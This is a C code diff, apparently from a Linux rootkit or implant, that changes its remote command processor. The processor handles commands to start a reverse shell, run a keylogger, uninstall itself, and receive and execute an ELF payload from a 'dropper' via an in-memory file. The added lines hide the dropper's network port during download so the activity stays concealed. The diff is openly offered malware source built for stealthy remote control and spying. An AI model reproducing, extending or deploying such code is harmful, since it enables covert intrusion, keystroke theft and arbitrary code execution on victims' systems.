@@ -134,10 +134,20 @@ static int receive_elf_from_dropper(command_processor_context_t *command_process
     if (!command_processor_ctx)
         return -EINVAL;
 
+    int ret = 0;
+
+    ret = hider_hide_port(command_processor_ctx->hider_ctx, DROPPER_PORT);
+    if (ret != 0)
+        return ret;
+
     command_processor_ctx->dropper_ctx.memory_file_fd = -1;
     command_processor_ctx->dropper_ctx.memory_file_name = "drop";
 
-    return dropper_receive(&command_processor_ctx->dropper_ctx);
+    ret = dropper_receive(&command_processor_ctx->dropper_ctx);
+    if (ret)
+        hider_unhide_port(command_processor_ctx->hider_ctx, DROPPER_PORT);
+
+    return ret;
 }
 
 static int run_elf_from_dropper(command_processor_context_t *command_processor_ctx) {
@@ -154,7 +164,7 @@ int command_processor_handle_received_command(void *ctx, void *data, size_t data
     if (!ctx || !data)
         return -EINVAL;
 
-    int res = 0;
+    int ret = 0;
 
     command_processor_context_t *command_processor_ctx = (command_processor_context_t *)ctx;
 
@@ -162,31 +172,31 @@ int command_processor_handle_received_command(void *ctx, void *data, size_t data
 
     switch (event->command_opcode) {
     case COMMAND_REVERSE_SHELL_START:
-        res = spawn_reverse_shell(command_processor_ctx);
+        ret = spawn_reverse_shell(command_processor_ctx);
         break;
     case COMMAND_REVERSE_SHELL_STOP:
         remove_reverse_shell(command_processor_ctx);
         break;
     case COMMAND_KEYLOGGER_START:
-        res = keylogger_start(command_processor_ctx);
+        ret = keylogger_start(command_processor_ctx);
         break;
     case COMMAND_KEYLOGGER_STOP:
-        res = keylogger_stop(command_processor_ctx);
+        keylogger_stop(command_processor_ctx);
         break;
     case COMMAND_UNINSTALL:;
         uninstall(command_processor_ctx);
         break;
     case COMMAND_DROPPER:
-        res = receive_elf_from_dropper(command_processor_ctx);
-        if (res)
+        ret = receive_elf_from_dropper(command_processor_ctx);
+        if (ret)
             break;
 
-        res = run_elf_from_dropper(command_processor_ctx);
+        ret = run_elf_from_dropper(command_processor_ctx);
         break;
     default:
-        res = -ENOTSUP;
+        ret = -ENOTSUP;
         break;
     }
 
-    return res;
+    return ret;
 }
